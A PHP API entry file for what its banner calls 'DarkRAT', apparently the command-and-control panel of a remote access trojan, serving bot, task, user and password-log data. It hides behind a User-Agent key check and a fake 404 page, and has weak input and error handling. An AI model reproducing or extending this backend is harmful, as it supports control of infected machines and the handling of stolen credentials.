<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
//ini_set('display_errors', 'On');

include("../config.php");
if($_SERVER['HTTP_USER_AGENT'] != $config["connectionkey"]){
    include("../pages/404.php");
    die();
}

//https://www.codeofaninja.com/2017/02/create-simple-rest-api-in-php.html

/*
________                __   __________    ________________    _____ __________.___ 
\______ \ _____ _______|  | _\______   \  /  _  \__    ___/   /  _  \\______   \   |
 |    |  \\__  \\_  __ \  |/ /|       _/ /  /_\  \|    |     /  /_\  \|     ___/   |
 |    `   \/ __ \|  | \/    < |    |   \/    |    \    |    /    |    \    |   |   |
/_______  (____  /__|  |__|_ \|____|_  /\____|__  /____|    \____|__  /____|   |___|
        \/     \/           \/       \/         \/                  \/              

        
 ________      ___    ___      ________  ________  ________  ___  __    ________  ________  ___  ________  _______   ________     
|\   __  \    |\  \  /  /|    |\   ___ \|\   __  \|\   __  \|\  \|\  \ |\   ____\|\   __  \|\  \|\   ___ \|\  ___ \ |\   __  \    
\ \  \|\ /_   \ \  \/  / /    \ \  \_|\ \ \  \|\  \ \  \|\  \ \  \/  /|\ \  \___|\ \  \|\  \ \  \ \  \_|\ \ \   __/|\ \  \|\  \   
 \ \   __  \   \ \    / /      \ \  \ \\ \ \   __  \ \   _  _\ \   ___  \ \_____  \ \   ____\ \  \ \  \ \\ \ \  \_|/_\ \   _  _\  
  \ \  \|\  \   \/  /  /        \ \  \_\\ \ \  \ \  \ \  \\  \\ \  \\ \  \|____|\  \ \  \___|\ \  \ \  \_\\ \ \  \_|\ \ \  \\  \| 
   \ \_______\__/  / /           \ \_______\ \__\ \__\ \__\\ _\\ \__\\ \__\____\_\  \ \__\    \ \__\ \_______\ \_______\ \__\\ _\ 
    \|_______|\___/ /             \|_______|\|__|\|__|\|__|\|__|\|__| \|__|\_________\|__|     \|__|\|_______|\|_______|\|__|\|__|
             \|___|/                                                      \|_________|                                            
                                                                                                                                  
                                                                                                                                  


API Usage:

API/?get={ACTION} -> GET: settings,bots,plogs,tasks,users,wordmap


!!WARNING!! POST ALL PARAMS FROM DATABASE TO THE API
API/?edit={ACTION} ->  EDIT: settings



*/

// include database and object files
include_once 'assets/ThirdParty/php-ref/ref.php';
include_once 'classes/Database.class.php';
include_once 'classes/Settings.class.php';
include_once 'classes/Bots.class.php';
include_once 'classes/Plogs.class.php';
include_once 'classes/Tasks.class.php'; 
include_once 'classes/Users.class.php';
 





$database = new Database();
$db = $database->getConnection();
 
$DEBUG = FALSE;


if(!$DEBUG){
    header("Access-Control-Allow-Origin: *");
    header("Content-Type: application/json; charset=UTF-8");
}else{
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
}


    //BEGIN THE MAGIC
    $username = trim($_GET["username"]);
    if(isset($_GET["get"])){
        include("read.php");

    }elseif(isset($_GET["edit"])){

        if(!empty($_GET["username"])){
            include("edit.php");
            }
    }



?>